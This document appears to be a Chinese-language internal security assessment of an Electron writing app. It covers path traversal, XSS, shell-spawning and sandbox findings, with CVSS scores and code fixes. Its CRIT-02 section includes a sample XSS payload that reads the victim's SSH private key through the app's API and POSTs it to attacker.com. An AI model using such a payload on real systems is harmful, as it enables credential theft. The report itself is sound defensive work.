---
title: "WriteFlow 資安評估報告（第二次）"
domain: quality
type: assessment
status: approved
owner: tech-team
updated: 2026-03-01
source_of_truth: false
---

# WriteFlow 資安評估報告（第二次）

**評估日期**: 2026-03-01
**評估角色**: Security Engineer
**應用程式版本**: 0.1.0
**技術堆疊**: Electron v39 + Vue 3 + TypeScript

---

## 一、執行摘要（Executive Summary）

| 項目 | 狀態 |
|------|------|
| 整體風險等級 | 🔴 **高風險** |
| 嚴重（Critical）問題 | 2 項 |
| 高危（High）問題 | 3 項 |
| 中危（Medium）問題 | 3 項 |
| 低危（Low）問題 | 2 項 |
| 良好實踐 | 6 項 |

**執行摘要**：WriteFlow 在核心的 Electron 安全設定方面做得不錯（`contextIsolation: true`、`nodeIntegration: false`），但存在兩個嚴重漏洞：**IPC 完全無路徑限制保護**（允許讀寫系統任意位置的檔案）以及 **markdown-it 開啟 `html: true` 但未採用任何 HTML sanitize**。由於 Electron renderer 透過 `window.electronAPI` 可存取強大的本機操作（讀寫檔案、執行 git push、啟動子程序），一旦 XSS 成功，攻擊者等同取得受限的本機執行能力。兩項嚴重問題必須優先修復。

---

## 二、詳細發現（Detailed Findings）

### 🔴 CRIT-01｜IPC 檔案操作無路徑限制（Path Traversal via Unrestricted IPC）

| 欄位 | 內容 |
|------|------|
| **嚴重程度** | 🔴 Critical |
| **CVSS v3.1** | AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = **8.8** |
| **影響檔案** | `src/main/services/FileService.ts`, `src/main/main.ts`, `src/main/preload.ts` |

**問題描述**：

`FileService` 對所有路徑操作（`readFile`、`writeFile`、`deleteFile`、`copyFile`、`createDirectory`）**完全沒有路徑白名單或路徑穿越基準檢查**。preload 將這些操作完整暴露給 renderer：

```typescript
// preload.ts - 無任何過濾直接轉發
readFile: (path: string) => ipcRenderer.invoke('read-file', path),
writeFile: (path: string, content: string) => ipcRenderer.invoke('write-file', path, content),
deleteFile: (path: string) => ipcRenderer.invoke('delete-file', path),
```

```typescript
// FileService.ts - 無任何路徑驗證
async readFile(filePath: string): Promise<string> {
  return await fs.readFile(filePath, "utf-8"); // 可讀取 C:\Windows\System32\ 任何檔案
}
async writeFile(filePath: string, content: string): Promise<void> {
  await fs.writeFile(filePath, content, "utf-8"); // 可覆寫任意系統檔案
}
```

**影響範圍**：
- 讀取：`~/.ssh/id_rsa`、`%APPDATA%\` 下的任何敏感設定、瀏覽器 Cookie 資料庫
- 寫入：可覆寫系統檔案、注入惡意 script 到任意位置
- 刪除：可刪除系統關鍵檔案
- 與 CRIT-02 XSS 結合後可形成完整的本機漏洞利用鏈

**修復建議**：

```typescript
// FileService.ts - 新增路徑驗證函式
import { resolve, normalize } from 'path'

private allowedBasePaths: string[] = []

setAllowedPaths(articlesDir: string, targetBlog: string, imagesDir: string): void {
  this.allowedBasePaths = [articlesDir, targetBlog, imagesDir]
    .filter(Boolean)
    .map(p => normalize(resolve(p)))
}

private validatePath(filePath: string): void {
  const normalized = normalize(resolve(filePath))
  const allowed = this.allowedBasePaths.some(base =>
    normalized.startsWith(base + path.sep) || normalized === base
  )
  if (!allowed) {
    throw new Error(`Access denied: path outside allowed directories: ${filePath}`)
  }
}

async readFile(filePath: string): Promise<string> {
  this.validatePath(filePath)   // ← 新增
  return await fs.readFile(filePath, "utf-8")
}
```

---

### 🔴 CRIT-02｜markdown-it `html: true` 搭配 `v-html` 無 Sanitize（Stored XSS → Electron API Abuse）

| 欄位 | 內容 |
|------|------|
| **嚴重程度** | 🔴 Critical |
| **CVSS v3.1** | AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H = **8.2** |
| **影響檔案** | `src/services/MarkdownService.ts`, `src/services/PreviewService.ts`, `src/components/PreviewPane.vue`, `src/components/SearchPanel.vue` |

**問題描述**：

存在三個層面的 XSS 風險：

**層面 A**：MarkdownService 啟用了 `html: true`，允許使用者 Markdown 內嵌任意 HTML，且最終輸出**未經任何 sanitize** 直接餵給 `v-html`：

```typescript
// MarkdownService.ts - 開啟 HTML 解析
this.md = new MarkdownIt({
  html: true,   // ← 致命設定！允許任意 HTML
  linkify: true,
  typographer: true,
})
```

**層面 B**：`PreviewService.preprocessObsidianSyntax` 以正則直接將使用者控制的 Markdown 內容轉換為 HTML 插入，部分路徑未完整 escape：

```typescript
// #tag 正則直接插入 span，tag 值從使用者內容取得
processed = processed.replace(/#([a-zA-Z0-9\u4e00-\u9fff_-]+)/g,
  '<span class="obsidian-tag">#$1</span>');  // $1 未做 HTML escape
```

**層面 C**：`SearchPanel.vue` 使用 `v-html` 渲染 `matchSnippet`，而 `highlightKeyword()` 函式對 `text` 參數（來自搜尋索引的原始檔案內容）**未做任何 escape**。

**攻擊情境**（共用 vault 場景）：

```markdown
# 惡意文章
<script>
(async () => {
  const key = await window.electronAPI.readFile('/Users/victim/.ssh/id_rsa')
  await fetch('https://attacker.com/steal', { method: 'POST', body: key })
})()
</script>
```

**修復建議**：

1. 立即將 `markdown-it` 的 `html` 選項改為 `false`
2. 安裝並整合 DOMPurify 統一 sanitize 所有 `v-html` 輸出
3. `highlightKeyword` 必須先 escape `text` 再插入 HTML

---

### 🟠 HIGH-01｜ProcessService 使用 `shell: true` 且無路徑驗證

**嚴重程度**: 🟠 High | CVSS: **7.8**

`shell: true` 即使使用引數陣列也會呼叫底層 shell（Windows: `cmd.exe /d /s /c`），且 `projectPath` 對 `cwd` 完全沒有路徑驗證。

```typescript
// ❌ 現狀
this.devServerProcess = spawn('npm', ['run', 'dev'], {
  cwd: projectPath,
  shell: true    // ← 風險！
})

// ✅ 修復
const npmCmd = platform() === 'win32' ? 'npm.cmd' : 'npm'
this.devServerProcess = spawn(npmCmd, ['run', 'dev'], {
  cwd: validatedProjectPath,
  shell: false,
})
```

---

### 🟠 HIGH-02｜`sandbox: false` 且缺少替代緩解措施

**嚴重程度**: 🟠 High | CVSS: **7.5**

`sandbox: false` 停用了 Chromium 的多層 sandbox 防護。若 renderer 被入侵，攻擊者更容易提升權限。評估改用 `sandbox: true` + CommonJS preload 的可行性。

---

### 🟠 HIGH-03｜IPC `set-config` 接受 `any` 型別且無 Schema 驗證

**嚴重程度**: 🟠 High | CVSS: **6.3**

```typescript
// ❌ 現狀
ipcMain.handle("set-config", (_, config: any) => configService.setConfig(config));
```

攻擊者（或 XSS payload）可以傳入惡意設定，竄改 `articlesDir`、`targetBlog` 指向系統關鍵路徑。建議安裝 Zod 進行 runtime schema 驗證。

---

### 🟡 MED-01｜`postProcessHtml` 注入 `onclick` 事件處理器

**嚴重程度**: 🟡 Medium | CVSS: **4.7**

`PreviewService.postProcessHtml` 使用 `onclick` 屬性，與 CSP 的 `unsafe-inline` 禁止衝突，建議改用事件委派。

---

### 🟡 MED-02｜開發模式 CSP 允許 `script-src 'unsafe-inline'`

**嚴重程度**: 🟡 Medium | CVSS: **4.3**

僅在開發模式生效（已正確隔離），建議考慮 nonce-based CSP 方案。

---

### 🟡 MED-03｜Git 操作無 `repoPath` 路徑驗證

**嚴重程度**: 🟡 Medium | CVSS: **4.0**

GitService 接受來自 renderer 的 `repoPath` 作為 `cwd`，未驗證是否在允許範圍內。

---

### 🟢 LOW-01｜API Key 降級使用 Base64

`safeStorage` 不可用時以 Base64 明文儲存（非加密），應明確警告使用者而非靜默降級。

---

### 🟢 LOW-02｜Sentry 錯誤回報可能洩露敏感資訊

AI API 錯誤拋送到 Sentry 時可能洩露 API key 前幾個字元，建議實作 `beforeSend` hook 過濾敏感欄位。

---

## 三、CVSS 評分表

| ID | 描述 | 分數 |
|----|------|------|
| CRIT-01 | IPC 無路徑限制 Path Traversal | **8.8** |
| CRIT-02 | markdown-it html:true + v-html XSS | **8.2** |
| HIGH-01 | ProcessService shell:true | **7.8** |
| HIGH-02 | sandbox:false | **7.5** |
| HIGH-03 | set-config 無 schema 驗證 | **6.3** |
| MED-01 | onclick 內聯事件處理器 | **4.7** |
| MED-02 | 開發 CSP unsafe-inline | **4.3** |
| MED-03 | gitService repoPath 無驗證 | **4.0** |
| LOW-01 | API Key Base64 降級 | **2.1** |
| LOW-02 | Sentry 可能洩露敏感資訊 | **3.7** |

---

## 四、修復優先順序

### 第一優先（本週必須完成）
1. **CRIT-02**：`markdown-it` 改 `html: false` + 安裝 DOMPurify（一小時內可完成）
2. **CRIT-01**：FileService 新增路徑白名單驗證（約半天）
3. **HIGH-03**：`setConfig` 加入 Zod schema 驗證（約 1 小時）

### 第二優先（本月完成）
4. **HIGH-01**：ProcessService 移除 `shell: true`
5. **HIGH-02**：評估 `sandbox: true` 的可行性
6. **MED-03**：GitService 加入 `repoPath` 白名單比對

### 第三優先（下月完成）
7. **MED-01**：移除 `onclick` 屬性改用事件委派
8. **LOW-01**：`safeStorage` 不可用時明確拒絕
9. **LOW-02**：Sentry `beforeSend` hook 過濾

---

## 五、資安正面發現（良好實踐）

| ✅ | 發現 |
|----|------|
| ✅ | `contextIsolation: true` — 正確啟用，renderer 與 main 完全隔離 |
| ✅ | `nodeIntegration: false` — 正確關閉 |
| ✅ | GitService 使用 `execFile` + 引數陣列 — 有效防止 Shell 注入 |
| ✅ | `safeStorage` 加密 API Key — 主流程正確使用 OS 層級加密 |
| ✅ | API Key 不傳入 Renderer — Renderer 永遠看不到 key 本身 |
| ✅ | IPC 頻道名稱集中管理 — `ipc-channels.ts` 以 `as const` 統一定義 |
| ✅ | CSP 生產/開發模式分離 — 生產模式無 `unsafe-inline` |
| ✅ | `getLog` 有參數安全化處理 |
